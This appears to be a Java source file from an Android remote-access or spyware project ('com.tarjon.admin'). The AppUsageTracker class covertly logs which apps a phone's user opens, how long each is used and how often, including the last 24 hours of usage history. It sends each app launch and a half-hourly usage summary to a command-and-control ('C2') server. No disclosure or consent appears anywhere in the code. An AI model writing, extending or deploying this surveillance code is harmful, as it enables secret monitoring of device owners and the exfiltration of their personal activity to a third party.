package com.tarjon.admin.utils;

import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Tracks app usage and application activity
 * Monitors which apps are used and for how long
 */
public class AppUsageTracker {
    private static final String TAG = "AppUsageTracker";
    
    private final Context context;
    private final C2Connection c2Connection;
    private ScheduledExecutorService scheduler;
    private long startTimeMs;
    
    // App usage data
    private final Map<String, AppUsage> appUsageMap = new HashMap<>();
    private String currentForegroundApp = "";
    private long currentAppStartTime = 0;
    
    // Tracking state
    private boolean isTracking = false;
    
    // Default interval
    private static final int DEFAULT_SYNC_INTERVAL = 30; // minutes
    
    /**
     * Class to store app usage data
     */
    private static class AppUsage {
        String packageName;
        String appName;
        long usageTimeMs = 0;
        int launchCount = 0;
        long lastUsed = 0;
        
        AppUsage(String packageName, String appName) {
            this.packageName = packageName;
            this.appName = appName;
        }
    }
    
    public AppUsageTracker(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
    }
    
    /**
     * Start tracking app usage
     */
    public void startTracking() {
        if (isTracking) {
            return;
        }
        
        isTracking = true;
        startTimeMs = System.currentTimeMillis();
        appUsageMap.clear();
        
        // Schedule periodic sync of usage data
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(
                this::syncUsageData,
                DEFAULT_SYNC_INTERVAL,
                DEFAULT_SYNC_INTERVAL,
                TimeUnit.MINUTES
        );
        
        // Initialize with current app usage
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                collectUsageStats();
            } catch (Exception e) {
                Log.e(TAG, "Error initializing app usage stats: " + e.getMessage());
            }
        }
    }
    
    /**
     * Stop tracking app usage
     */
    public void stopTracking() {
        if (!isTracking) {
            return;
        }
        
        isTracking = false;
        
        // Shutdown scheduler
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
            scheduler = null;
        }
        
        // Final sync of data
        syncUsageData();
    }
    
    /**
     * Track usage of an app
     * @param packageName Package name of the app
     * @param activityName Activity name (optional)
     */
    public void trackAppUsage(String packageName, String activityName) {
        if (!isTracking || packageName == null || packageName.isEmpty()) {
            return;
        }
        
        long currentTime = System.currentTimeMillis();
        
        // If switching apps, update usage time for previous app
        if (!packageName.equals(currentForegroundApp) && !currentForegroundApp.isEmpty() && currentAppStartTime > 0) {
            long usageTime = currentTime - currentAppStartTime;
            
            AppUsage usage = appUsageMap.get(currentForegroundApp);
            if (usage != null) {
                usage.usageTimeMs += usageTime;
                usage.lastUsed = currentTime;
            }
        }
        
        // Update current app
        if (!packageName.equals(currentForegroundApp)) {
            currentForegroundApp = packageName;
            currentAppStartTime = currentTime;
            
            // Get or create app usage entry
            if (!appUsageMap.containsKey(packageName)) {
                String appName = getAppNameFromPackage(packageName);
                appUsageMap.put(packageName, new AppUsage(packageName, appName));
            }
            
            // Increment launch count
            AppUsage usage = appUsageMap.get(packageName);
            if (usage != null) {
                usage.launchCount++;
                usage.lastUsed = currentTime;
            }
            
            // Log app launch
            logAppLaunch(packageName, activityName);
        }
    }
    
    /**
     * Log when an app is launched
     */
    private void logAppLaunch(String packageName, String activityName) {
        try {
            JSONObject launchData = new JSONObject();
            launchData.put("packageName", packageName);
            launchData.put("appName", getAppNameFromPackage(packageName));
            launchData.put("activityName", activityName != null ? activityName : "");
            launchData.put("timestamp", System.currentTimeMillis());
            
            c2Connection.sendCommandResult("app_launch", 
                    "App launched: " + getAppNameFromPackage(packageName), 
                    launchData.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating app launch JSON: " + e.getMessage());
        }
    }
    
    /**
     * Get app name from package name
     */
    private String getAppNameFromPackage(String packageName) {
        PackageManager pm = context.getPackageManager();
        try {
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (PackageManager.NameNotFoundException e) {
            return packageName;
        }
    }
    
    /**
     * Collect usage stats using the UsageStatsManager API
     */
    private void collectUsageStats() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) {
            return;
        }
        
        UsageStatsManager usageStatsManager = (UsageStatsManager) 
                context.getSystemService(Context.USAGE_STATS_SERVICE);
        
        if (usageStatsManager == null) {
            return;
        }
        
        // Get usage events for last 24 hours
        long endTime = System.currentTimeMillis();
        long startTime = endTime - (24 * 60 * 60 * 1000);
        
        UsageEvents usageEvents = usageStatsManager.queryEvents(startTime, endTime);
        if (usageEvents == null) {
            return;
        }
        
        // Process usage events
        UsageEvents.Event event = new UsageEvents.Event();
        String currentApp = null;
        long currentAppTime = 0;
        
        while (usageEvents.hasNextEvent()) {
            usageEvents.getNextEvent(event);
            
            if (event.getEventType() == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                // App moved to foreground
                currentApp = event.getPackageName();
                currentAppTime = event.getTimeStamp();
                
                // Create app usage entry if it doesn't exist
                if (!appUsageMap.containsKey(currentApp)) {
                    String appName = getAppNameFromPackage(currentApp);
                    appUsageMap.put(currentApp, new AppUsage(currentApp, appName));
                }
                
                // Increment launch count
                AppUsage usage = appUsageMap.get(currentApp);
                if (usage != null) {
                    usage.launchCount++;
                }
                
            } else if (event.getEventType() == UsageEvents.Event.MOVE_TO_BACKGROUND) {
                // App moved to background
                if (currentApp != null && currentApp.equals(event.getPackageName()) && currentAppTime > 0) {
                    long usageTime = event.getTimeStamp() - currentAppTime;
                    
                    AppUsage usage = appUsageMap.get(currentApp);
                    if (usage != null) {
                        usage.usageTimeMs += usageTime;
                        usage.lastUsed = event.getTimeStamp();
                    }
                    
                    currentApp = null;
                    currentAppTime = 0;
                }
            }
        }
    }
    
    /**
     * Sync usage data to C2 server
     */
    private void syncUsageData() {
        if (!isTracking || appUsageMap.isEmpty()) {
            return;
        }
        
        try {
            // Create JSON with app usage data
            JSONObject usageData = new JSONObject();
            JSONArray appsArray = new JSONArray();
            
            for (AppUsage usage : appUsageMap.values()) {
                JSONObject appData = new JSONObject();
                appData.put("packageName", usage.packageName);
                appData.put("appName", usage.appName);
                appData.put("usageTimeMs", usage.usageTimeMs);
                appData.put("usageTimeFormatted", formatDuration(usage.usageTimeMs));
                appData.put("launchCount", usage.launchCount);
                appData.put("lastUsed", usage.lastUsed);
                
                if (usage.lastUsed > 0) {
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                    appData.put("lastUsedFormatted", sdf.format(new Date(usage.lastUsed)));
                } else {
                    appData.put("lastUsedFormatted", "Never");
                }
                
                appsArray.put(appData);
            }
            
            usageData.put("apps", appsArray);
            usageData.put("count", appsArray.length());
            usageData.put("startTime", startTimeMs);
            usageData.put("endTime", System.currentTimeMillis());
            
            // Send to C2 server
            c2Connection.sendCommandResult("app_usage", 
                    "App usage data collected for " + appsArray.length() + " apps", 
                    usageData.toString());
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating app usage JSON: " + e.getMessage());
        }
    }
    
    /**
     * Format duration in milliseconds to human-readable string
     */
    private String formatDuration(long durationMs) {
        long seconds = durationMs / 1000;
        long minutes = seconds / 60;
        long hours = minutes / 60;
        
        minutes %= 60;
        seconds %= 60;
        
        if (hours > 0) {
            return String.format(Locale.US, "%d h %d min %d sec", hours, minutes, seconds);
        } else if (minutes > 0) {
            return String.format(Locale.US, "%d min %d sec", minutes, seconds);
        } else {
            return String.format(Locale.US, "%d sec", seconds);
        }
    }
    
    /**
     * Get usage data for a specific app
     * @param packageName Package name of the app
     * @return JSONObject with app usage data
     */
    public JSONObject getAppUsage(String packageName) throws JSONException {
        JSONObject appData = new JSONObject();
        
        AppUsage usage = appUsageMap.get(packageName);
        if (usage != null) {
            appData.put("packageName", usage.packageName);
            appData.put("appName", usage.appName);
            appData.put("usageTimeMs", usage.usageTimeMs);
            appData.put("usageTimeFormatted", formatDuration(usage.usageTimeMs));
            appData.put("launchCount", usage.launchCount);
            appData.put("lastUsed", usage.lastUsed);
            
            if (usage.lastUsed > 0) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                appData.put("lastUsedFormatted", sdf.format(new Date(usage.lastUsed)));
            } else {
                appData.put("lastUsedFormatted", "Never");
            }
        } else {
            appData.put("packageName", packageName);
            appData.put("appName", getAppNameFromPackage(packageName));
            appData.put("usageTimeMs", 0);
            appData.put("usageTimeFormatted", "0 sec");
            appData.put("launchCount", 0);
            appData.put("lastUsed", 0);
            appData.put("lastUsedFormatted", "Never");
        }
        
        return appData;
    }
}